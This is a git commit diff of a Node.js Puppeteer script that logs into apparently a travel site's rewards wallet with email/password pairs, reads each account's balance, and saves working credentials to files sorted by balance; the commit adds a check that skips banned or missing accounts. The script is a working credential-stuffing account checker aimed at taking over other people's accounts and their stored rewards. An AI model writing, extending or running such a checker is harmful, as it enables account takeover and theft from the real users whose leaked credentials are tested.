374eaa4e1857fcec4226f8e2377b84bb278bd1cb
Rama Seftiansyah <ramaseftiansyah12@gmail.com>
2020-07-11 15:39:21 +0700

    Fix Disable Account

--- index.js
+++ index.js
@@ -2,7 +2,6 @@ const puppeteer = require("puppeteer");
 const delay = require("delay");
 const fs = require("fs");
 const tanya = require("readline-sync");
-const { del } = require("request");
 const LoginAndCheck = (mail, pass) =>
   new Promise((resolve, reject) => {
     (async () => {
@@ -24,32 +23,42 @@ const LoginAndCheck = (mail, pass) =>
         await page.click(
           "#root > div > div.access-container.bui_font_body > div > div.access-panel.bui-spacer--large.box-shadow.nw-access-panel > div.transition-container > div > div > div > form > button"
         );
-        await page.waitForSelector(
-          "#b2rewards_and_walletPage > div:nth-child(5) > div > div._0bd996b799 > div > div > div > div > div.a452463387.bui-grid__column-4 > div:nth-child(1) > div > a > div > div.bui-f-font-display_one > span:nth-child(1)"
-        );
-        let saldoAwal = await (
-          await (
-            await page.$(
-              "#b2rewards_and_walletPage > div:nth-child(5) > div > div._0bd996b799 > div > div > div > div > div.e2074815c7.bui-grid__column-8 > div:nth-child(4) > div > ul > li > button > div > div.bui-accordion__row-header > h3 > div > span"
+        if (
+          (await (
+            await (await page.$("span.bui-button__text")).getProperty(
+              "textContent"
             )
-          ).getProperty("textContent")
-        ).jsonValue();
-        let saldoAkhir = await (
-          await (
-            await page.$(
-              "#b2rewards_and_walletPage > div:nth-child(5) > div > div._0bd996b799 > div > div > div > div > div.a452463387.bui-grid__column-4 > div:nth-child(1) > div > a > div > div.bui-f-font-display_one > span:nth-child(1)"
-            )
-          ).getProperty("textContent")
-        ).jsonValue();
-        let data = `${mail}|${pass}\n`;
-        if (saldoAwal.match(/150/g)) {
-          fs.appendFileSync("valid_150.txt", data);
-        } else if (saldoAwal.match(/23/g)) {
-          fs.appendFileSync("valid_230an.txt", data);
+          ).jsonValue()) == "Contact Support"
+        ) {
+          console.log(`[GAGAL] Akun Tidak Ditemukan/Sudah Di Banned`);
         } else {
-          fs.appendFileSync("valid_lain.txt", data);
+          await page.waitForSelector(
+            "#b2rewards_and_walletPage > div:nth-child(5) > div > div._0bd996b799 > div > div > div > div > div.a452463387.bui-grid__column-4 > div:nth-child(1) > div > a > div > div.bui-f-font-display_one > span:nth-child(1)"
+          );
+          let saldoAwal = await (
+            await (
+              await page.$(
+                "#b2rewards_and_walletPage > div:nth-child(5) > div > div._0bd996b799 > div > div > div > div > div.e2074815c7.bui-grid__column-8 > div:nth-child(4) > div > ul > li > button > div > div.bui-accordion__row-header > h3 > div > span"
+              )
+            ).getProperty("textContent")
+          ).jsonValue();
+          let saldoAkhir = await (
+            await (
+              await page.$(
+                "#b2rewards_and_walletPage > div:nth-child(5) > div > div._0bd996b799 > div > div > div > div > div.a452463387.bui-grid__column-4 > div:nth-child(1) > div > a > div > div.bui-f-font-display_one > span:nth-child(1)"
+              )
+            ).getProperty("textContent")
+          ).jsonValue();
+          let data = `${mail}|${pass}\n`;
+          if (saldoAwal.match(/150/g)) {
+            fs.appendFileSync("valid_150.txt", data);
+          } else if (saldoAwal.match(/23/g)) {
+            fs.appendFileSync("valid_230an.txt", data);
+          } else {
+            fs.appendFileSync("valid_lain.txt", data);
+          }
+          resolve(`${saldoAkhir}/${saldoAwal}`);
         }
-        resolve(`${saldoAkhir}/${saldoAwal}`);
       } catch (error) {
         resolve("false");
       }
